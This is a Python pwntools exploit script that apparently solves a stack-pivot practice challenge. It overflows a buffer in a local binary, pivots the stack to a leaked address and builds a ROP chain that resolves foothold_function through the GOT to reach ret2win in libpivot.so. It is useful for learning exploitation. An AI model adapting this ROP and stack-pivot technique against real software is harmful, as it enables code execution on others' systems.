import pwn

OFFSET = 40
p = pwn.process("./pivot")
pwn.context.binary = p.elf
lib = pwn.ELF("./libpivot.so")

def send_payload(payload):
    p.recvuntil(b"place to pivot:")
    location_to_write_payload = int(p.recvuntil(b'\n').strip(), 16)
    p.sendafter(b"> ", payload)

    rop = pwn.ROP(p.elf)
    rop.raw(rop.rax)
    rop.raw(location_to_write_payload)
    rop.raw(next(p.elf.search(pwn.asm("xchg rax, rsp; ret"), executable=True)))
    p.sendafter(b"> ", OFFSET * b"A" + rop.chain())

# https://refspecs.linuxfoundation.org/ELF/zSeries/lzsabi0_zSeries/x2251.html
rop = pwn.ROP(p.elf)
rop.raw(p.elf.plt["foothold_function"]) # LD_BIND_NOW=1 to disable lazy dynamic loading
rop.raw(rop.rax)
rop.raw(p.elf.got["foothold_function"])
rop.raw(next(p.elf.search(pwn.asm("mov rax, qword ptr [rax]; ret"), executable=True)))
rop.raw(rop.rbp)
rop.raw(lib.sym['ret2win'] - lib.sym['foothold_function'])
rop.raw(next(rop.elfs[0].search(pwn.asm("add rax, rbp; ret"), executable=True)))
rop.raw(next(rop.elfs[0].search(pwn.asm("call rax"), executable=True)))
send_payload(rop.chain())

p.stream()
